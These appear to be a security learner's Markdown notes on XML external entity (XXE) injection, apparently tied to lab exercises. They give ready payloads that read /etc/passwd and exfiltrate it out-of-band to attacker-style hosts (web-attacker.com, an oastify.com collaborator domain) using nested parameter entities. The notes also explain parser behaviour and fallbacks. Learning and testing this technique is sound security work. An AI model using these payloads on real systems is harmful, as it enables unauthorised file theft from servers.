- Always check the `out-of-band` blind XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> 
]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```
if that didn't work check those other things:

- Does the app accept declaring ENTITY? try doing it without reference it
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
 <!ENTITY foo "1" > 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- Try reference the ENTITY:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
 <!ENTITY foo "1" > 
]>
<stockCheck>
	<productId>&foo;</productId>
	<storeId>1</storeId>
</stockCheck>
```
- Try doing external ENTITY:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
 <!ENTITY foo SYSTEM "file:///etc/passwd" > 
]>
<stockCheck>
	<productId>&foo;</productId>
	<storeId>1</storeId>
</stockCheck>
```




---

## Why do we need extra entites in exploiting out-of-band XXE:
if you did this:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % ext SYSTEM "http://wyy3ecdnxsrzmfz5t8xw0pf7pyvpjh76.oastify.com/%file;"> 
	%ext;
]>
```
Then the request to the my server would be:
```http
GET /%abc; HTTP/1.1
User-Agent: Java/21.0.1
Host: wyy3ecdnxsrzmfz5t8xw0pf7pyvpjh76.oastify.com
Accept: */*
Connection: keep-alive
```

many parsers won’t expand a parameter entity _inside the `SYSTEM` literal_ the way you expect, and even when they do the raw file text will usually break the URI (newlines, spaces, special chars). That’s why the multi-step `%eval` trick is used: it forces the parser to _generate a new DTD declaration_ (which contains the file contents) and then to resolve that declaration, producing a clean HTTP fetch.

### Why your one-liner is fragile / usually fails
1. **Expansion order & implementation differences**    
    - Parameter entities (`%file;`) are expanded while the DTD is being processed, but whether they are expanded _inside the quoted SYSTEM identifier of another entity declaration_ is implementation-dependent. Many XML processors treat the SYSTEM literal as an opaque string and do **not** substitute parameter entities inside it before resolving the URI. That means `http://attacker/%file;` may be fetched literally (with the percent text) or the parser may error — not reliably the desired HTTP request with file contents.
2. **URI / encoding problems**
    - `/etc/passwd` contents contain newlines, spaces or characters not allowed raw inside a URL. Parsers do **not** percent-encode arbitrary file contents for you. If `%file;` expands to a multi-line string, the constructed URI will be malformed or the request truncated at the first newline.

so we will use:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % expand "<!ENTITY &#x25; sender SYSTEM 'http://wyy3ecdnxsrzmfz5t8xw0pf7pyvpjh76.oastify.com?x=%file;'>" >
	%expand;
	%sender;
]>
```
- Use `expand` as normal parameter entity that can be used to help in fetching data by calling `%file;`.
- Then use `sender`to send data back.

> [!NOTE]
> This technique might not work with some file contents, including the newline characters contained in the `/etc/passwd` file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead.

